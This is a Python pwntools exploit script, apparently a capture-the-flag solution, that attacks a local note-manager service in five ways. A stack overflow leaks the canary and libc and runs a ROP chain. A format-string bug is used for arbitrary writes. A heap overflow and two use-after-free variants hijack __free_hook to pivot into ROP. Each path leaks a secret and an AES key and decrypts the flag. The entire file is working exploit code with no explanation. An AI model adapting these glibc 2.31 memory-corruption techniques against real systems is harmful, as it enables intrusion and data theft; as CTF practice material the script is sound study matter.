#!/usr/bin/python2
from pwn import *
from Crypto.Cipher import AES

ip = '127.0.0.1'
port = 9999
context.bits = 64
libc = ELF('libc-2.31.so')

rc          = lambda n          : io.recv(n)
ru          = lambda x          : io.recvuntil(x, drop = True)
sa          = lambda a, b       : io.sendafter(a, b)
sla         = lambda a, b       : io.sendlineafter(a, b)
ia          = lambda            : io.interactive()
uu64        = lambda x          : u64(x.ljust(8, '\x00'))
libc_os     = lambda x          : libc_base + x
heap_os     = lambda x          : heap_base + x

def menu(choice):
    sla('choice: ', str(choice))

def add(idx, size, content):
    menu(1)
    sla('index: ', str(idx))
    sla('size: ', str(size))
    sa('content: ', content)

def show(idx):
    menu(2)
    sla('index: ', str(idx))

def delete(idx):
    menu(3)
    sla('index: ', str(idx))

def sof():
    global io
    global heap_base
    global libc_base
    io = remote(ip, port)
    info('Exploit stack overflow...')

    sa('Username: ', 'Mai'.ljust(0xd, 'a'))
    ru('Hello ')
    rc(0xc)
    canary = u64(rc(8)) - 0x61
    sa('Password: ', '1202'.ljust(0xc, 'a') + flat(canary, 0) + '\xab')

    sa('Username: ', 'Mai'.ljust(0x3c, 'a'))
    ru('Hello ')
    rc(0x3c)
    libc_base = uu64(rc(6)) - 0x24083
    key_addr = libc_os(0x4f7000)
    secret_addr = libc_os(-0x2c000)
    pop_rdi = libc_os(0x0000000000023b6a)
    pop_rsi = libc_os(0x000000000002601f)
    pop_rdx_r12 = libc_os(0x0000000000119431)
    write_addr = libc_os(libc.sym['write'])

    rop_chain = flat([
        pop_rdi,
        1,
        pop_rsi,
        secret_addr,
        pop_rdx_r12,
        0x50,
        0,
        write_addr,
        pop_rsi,
        key_addr,
        write_addr
    ])
    sa('Password: ', '1202'.ljust(0xc, 'a') + flat(canary, 0, rop_chain))

    ru('Login successful\n')
    flag = rc(0x50)
    key = rc(0x10)
    p = AES.new(key, AES.MODE_ECB)
    flag = p.decrypt(flag)
    flag = flag[:flag.index('}') + 1]
    info('Get flag')
    print flag

def fsb():
    global io
    global heap_base
    global libc_base
    io = remote(ip, port)
    info('Exploit format string bug...')

    sa('Username: ', 'Mai')
    sa('Password: ', '1202')
    add(0, 0x60, '%13$p\n')
    show(0)
    libc_base = int(rc(14), 16) -  0x24083
    key_addr = libc_os(0x4f7000)
    secret_addr = libc_os(-0x2c000)

    add(0, 0x60, '%30$p\n')
    show(0)
    victim = int(rc(14), 16)

    add(0, 0x60, '%' + str(int(hex(victim + 0x12)[-4:], 16)) + 'c%30$hn\n')
    show(0)
    add(0, 0x60, '%' + str(int(hex(secret_addr)[-8:-4], 16)) + 'c%43$hn\n')
    show(0)

    add(0, 0x60, '%' + str(int(hex(victim + 0x14)[-4:], 16)) + 'c%30$hn\n')
    show(0)
    add(0, 0x60, '%' + str(int(hex(secret_addr)[-12:-8], 16)) + 'c%43$n\n')
    show(0)

    add(0, 0x60, '%' + str(int(hex(victim + 0x10)[-4:], 16)) + 'c%30$hn\n')
    show(0)
    add(0, 0x60, '%' + str(int(hex(secret_addr)[-4:], 16)) + 'c%43$hn\n')
    show(0)

    add(0, 0x60, '%45$s\n')
    show(0)
    flag = ru('\n[1] Add note')
    flag_fix = False
    while ((len(flag) % 0x10) != 0):
        flag += '\x00'
        add(0, 0x60, '%' + str(int(hex(secret_addr + len(flag))[-2:], 16)) + 'c%43$hhn\n')
        show(0)
        add(0, 0x60, '%45$s\n')
        show(0)
        flag += ru('\n[1] Add note')

    add(0, 0x60, '%' + str(int(hex(victim + 0x12)[-4:], 16)) + 'c%30$hn\n')
    show(0)
    add(0, 0x60, '%' + str(int(hex(key_addr)[-8:-4], 16)) + 'c%43$hn\n')
    show(0)

    add(0, 0x60, '%' + str(int(hex(victim + 0x14)[-4:], 16)) + 'c%30$hn\n')
    show(0)
    add(0, 0x60, '%' + str(int(hex(key_addr)[-12:-8], 16)) + 'c%43$n\n')
    show(0)

    add(0, 0x60, '%' + str(int(hex(victim + 0x10)[-4:], 16)) + 'c%30$hn\n')
    show(0)
    add(0, 0x60, '%' + str(int(hex(key_addr)[-4:], 16)) + 'c%43$hn\n')
    show(0)

    add(0, 0x60, '%45$s\n')
    show(0)
    key = ru('\n[1] Add note')
    while (len(key) != 0x10):
        key += '\x00'
        add(0, 0x60, '%' + str(int(hex(key_addr)[-2:], 16)) + 'c%43$hhn\n')
        show(0)
        add(0, 0x60, '%45$s\n')
        show(0)
        key += ru('\n[1] Add note')
    p = AES.new(key, AES.MODE_ECB)
    flag = p.decrypt(flag)
    flag = flag[:flag.index('}') + 1]
    info('Get flag')
    print flag

def hof():
    global io
    global heap_base
    global libc_base
    io = remote(ip, port)
    info('Exploit heap overflow...')

    sla('Username: ', 'Mai')
    sla('Password: ', '1202')
    add(0, 0x20, 'a\n')
    add(1, 0x20, 'a\n')
    add(2, 0x20, 'a\n')
    add(3, 0x30, 'a\n')
    add(5, 0x20, 'a\n')
    add(6, 0x51, 'a' * 0x52)
    add(7, 0x40, 'a\n')
    delete(1)
    delete(0)
    add(1, 0x28, 'a' * 0x28 + '\x51')
    add(0, 0x28, 'a\n')
    delete(1)
    delete(3)
    delete(2)
    delete(0)
    delete(5)
    add(0, 0x31, 'a' * 0x32)
    show(0)
    rc(0x40)
    heap_base = uu64(rc(6)) - 0x3b0

    add(1, 0x40, flat({0x38: 0x41}) + '\n')
    add(2, 0x28, 'a' * 0x28 + '\x71')
    for _ in range(6):
        add(0, 0x60, 'a\n')
    add(1, 0x40, 'a\n')
    add(0, 0x60, 'a' * 0x10 + flat(0x650, 0x41) + '\n')
    delete(0)
    delete(1)
    add(0, 0x60, 'a' * 0x40 + flat(heap_os(0x390)) + 'a' * 0x10 + flat(0x661) + '\n')
    add(3, 0x20, 'a\n')
    add(0, 0x60, 'a' * 0x38 + flat(0x61, heap_os(0x350)) + 'a' * 0x10 + flat(0x661) + '\n')
    add(0, 0x20, 'a\n')
    delete(7)
    delete(0)
    delete(3)
    show(6)
    rc(0x60)
    libc_base = uu64(rc(6)) - 0x1ecbe0
    key_addr = libc_os(0x4f7000)
    secret_addr = libc_os(-0x2c000)
    pop_rdi = libc_os(0x0000000000023b6a)
    pop_rsi = libc_os(0x000000000002601f)
    pop_rdx_r12 = libc_os(0x0000000000119431)
    pop2 = libc_os(0x0000000000119431)
    leave = libc_os(0x00000000000578c8)
    fh_addr = libc_os(libc.sym['__free_hook'])
    write_addr = libc_os(libc.sym['write'])
    gadget = libc_os(0x155006)

    add(7, 0x60, 'a' * 0x40 + flat(fh_addr) + 'a' * 0x10 + flat(0x661) + '\xe0')
    pld = flat([
        pop_rsi,
        secret_addr,
        pop_rdx_r12,
        0x50,
        0,
        write_addr,
        pop_rsi,
        key_addr,
        write_addr
    ])
    add(6, 0x40, 'a\n')
    add(6, 0x5e, 'a' * 0x10 + pld[:-2] + '\n')
    delete(6)
    pld = flat({
        0: gadget,
        8: heap_os(0x338),
        0x10: pop2,
        0x20: fh_addr + 0x18,
        0x28: pop_rdi,
        0x30: 1,
        0x38: leave,
        0x40: leave,
        0x48: fh_addr + 8
    })
    add(6, 0x50, pld[:-2] + '\n')

    flag = rc(0x50)
    key = rc(0x10)
    p = AES.new(key, AES.MODE_ECB)
    flag = p.decrypt(flag)
    flag = flag[:flag.index('}') + 1]
    info('Get flag')
    print flag

def uaf():
    global io
    global heap_base
    global libc_base
    io = remote(ip, port)
    info('Exploit use after free...')

    sla('Username: ', 'Mai')
    sla('Password: ', '1202')
    for i in range(8):
        add(i, 8, 'a\n')
    for i in range(3):
        delete(i)
    delete(4)
    delete(6)
    delete(5)
    delete(7)
    add(0, 0, '\n')
    add(1, 0, '\n')
    delete(7)
    delete(1)
    for i in range(6):
        add(i, 0, '\n')
    add(5, 0, '\n')
    add(7, 3, 'a' * 4)
    delete(1)
    show(7)
    rc(0x20)
    heap_base = uu64(rc(6)) - 0x3a0

    for i in range(8):
        add(i, 0x20, 'a\n')
    for _ in range(8):
        add(1, 0x60, 'a\n')
    add(1, 0x40, 'a' * 0x20 + flat(0x5a0, 0x31) + '\n')
    add(1, 0x50, 'a' * 0x20 + flat(0x5a0, 0x31) + '\n')
    add(1, 0x20, 'a\n')
    add(1, 0x30, 'a\n')
    delete(0)
    delete(1)
    for i in range(3, 8):
        delete(i)
    delete(2)
    add(1, 0x20, 'a\n')
    delete(2)
    add(3, 0x20, 'a\n')
    for _ in range(6):
        add(1, 0x20, 'a\n')
    delete(3)
    add(3, 0x2f, flat(heap_os(0x4e0)) + 'a' * 0x10 + flat(0x651) + '\n')
    add(3, 0x2f, flat(heap_os(0x4e0)) + 'a' * 0x10 + flat(0x651) + '\n')
    delete(3)
    show(2)
    rc(0x20)
    libc_base = uu64(rc(6)) - 0x1ecbe0
    key_addr = libc_os(0x4f7000)
    secret_addr = libc_os(-0x2c000)
    pop_rdi = libc_os(0x0000000000023b6a)
    pop_rsi = libc_os(0x000000000002601f)
    pop_rdx_r12 = libc_os(0x0000000000119431)
    pop2 = libc_os(0x0000000000119431)
    leave = libc_os(0x00000000000578c8)
    fh_addr = libc_os(libc.sym['__free_hook'])
    write_addr = libc_os(libc.sym['write'])
    gadget = libc_os(0x155006)

    add(4, 0x30, 'a' * 0x18 + flat(0x651, libc_os(0x1ecbe0), libc_os(0x1ecbe0))[:-1] + '\n')
    add(4, 0x50, 'a' * 0x20 + flat(0x650, 0x30) + '\n')
    add(5, 0x50, 'a' * 0x20 + flat(0x5e0, 0x30) + '\n')
    delete(5)
    delete(4)
    add(6, 0x30, 'a' * 0x20 + flat(fh_addr) + '\n')
    pld = flat([
        pop_rsi,
        secret_addr,
        write_addr,
        pop_rsi,
        key_addr,
        write_addr
    ])
    add(6, 0x40, 'a' * 0x10 + pld[:-1] + '\n')
    delete(6)
    add(6, 0x50, 'a' * 0x20 + flat(0x4d0, 0x30) + '\n')
    pld = flat({
        0: gadget,
        8: heap_os(0x628),
        0x10: pop2,
        0x20: fh_addr + 0x28,
        0x28: pop_rdi,
        0x30: 1,
        0x38: pop_rdx_r12,
        0x40: 0x50,
        0x48: fh_addr + 8,
        0x50: leave,
    })
    add(6, 0x60, pld + '\n')

    flag = rc(0x50)
    key = rc(0x10)
    p = AES.new(key, AES.MODE_ECB)
    flag = p.decrypt(flag)
    flag = flag[:flag.index('}') + 1]
    info('Get flag')
    print flag

def uaf_fixed_oby():
    global io
    global heap_base
    global libc_base
    io = remote(ip, port)
    info('Exploit use after free with off-by-one bug fixed...')

    sla('Username: ', 'Mai')
    sla('Password: ', '1202')
    for i in range(8):
        add(i, 8, 'a\n')
    for i in range(3):
        delete(i)
    delete(4)
    delete(6)
    delete(5)
    delete(7)
    add(0, 0, '')
    add(1, 0, '')
    delete(7)
    delete(1)
    for i in range(6):
        add(i, 0, '')
    add(5, 0, '')
    add(7, 3, 'a' * 3)
    delete(1)
    show(7)
    rc(0x20)
    heap_base = uu64(rc(6)) - 0x3a0

    for i in range(8):
        add(i, 0x20, 'a\n')
    for _ in range(8):
        add(1, 0x60, 'a\n')
    add(1, 0x40, 'a' * 0x20 + flat(0x5a0, 0x31) + '\n')
    add(1, 0x50, 'a' * 0x20 + flat(0x5a0, 0x31) + '\n')
    add(1, 0x20, 'a\n')
    add(1, 0x30, 'a\n')
    delete(0)
    delete(1)
    for i in range(3, 8):
        delete(i)
    delete(2)
    add(1, 0x20, 'a\n')
    delete(2)
    add(3, 0x20, 'a\n')
    for _ in range(6):
        add(1, 0x20, 'a\n')
    delete(3)
    add(3, 0x2f, flat(heap_os(0x4e0)) + 'a' * 0x10 + flat(0x651) + '\n')
    add(3, 0x2f, flat(heap_os(0x4e0)) + 'a' * 0x10 + flat(0x651) + '\n')
    delete(3)
    show(2)
    rc(0x20)
    libc_base = uu64(rc(6)) - 0x1ecbe0
    key_addr = libc_os(0x4f7000)
    secret_addr = libc_os(-0x2c000)
    pop_rdi = libc_os(0x0000000000023b6a)
    pop_rsi = libc_os(0x000000000002601f)
    pop_rdx_r12 = libc_os(0x0000000000119431)
    pop2 = libc_os(0x0000000000119431)
    leave = libc_os(0x00000000000578c8)
    fh_addr = libc_os(libc.sym['__free_hook'])
    write_addr = libc_os(libc.sym['write'])
    gadget = libc_os(0x155006)

    add(4, 0x30, 'a' * 0x18 + flat(0x651, libc_os(0x1ecbe0), libc_os(0x1ecbe0))[:-2] + '\n')
    add(4, 0x50, 'a' * 0x20 + flat(0x650, 0x30) + '\n')
    add(5, 0x50, 'a' * 0x20 + flat(0x5e0, 0x30) + '\n')
    delete(5)
    delete(4)
    add(6, 0x30, 'a' * 0x20 + flat(fh_addr) + '\n')
    pld = flat([
        pop_rsi,
        secret_addr,
        write_addr,
        pop_rsi,
        key_addr,
        write_addr
    ])
    add(6, 0x40, 'a' * 0x10 + pld[:-2] + '\n')
    delete(6)
    add(6, 0x50, 'a' * 0x20 + flat(0x4d0, 0x30) + '\n')
    pld = flat({
        0: gadget,
        8: heap_os(0x628),
        0x10: pop2,
        0x20: fh_addr + 0x28,
        0x28: pop_rdi,
        0x30: 1,
        0x38: pop_rdx_r12,
        0x40: 0x50,
        0x48: fh_addr + 8,
        0x50: leave,
    })
    add(6, 0x60, pld + '\n')

    flag = rc(0x50)
    key = rc(0x10)
    p = AES.new(key, AES.MODE_ECB)
    flag = p.decrypt(flag)
    flag = flag[:flag.index('}') + 1]
    info('Get flag')
    print flag

if __name__ == '__main__':
    try:
        sof()
    except:
        info('Failed to get flag')
    try:
        fsb()
    except:
        info('Failed to get flag')
    try:
        hof()
    except:
        info('Failed to get flag')
    try:
        uaf()
    except:
        info('Failed to get flag')
    try:
        uaf_fixed_oby()
    except:
        info('Failed to get flag')
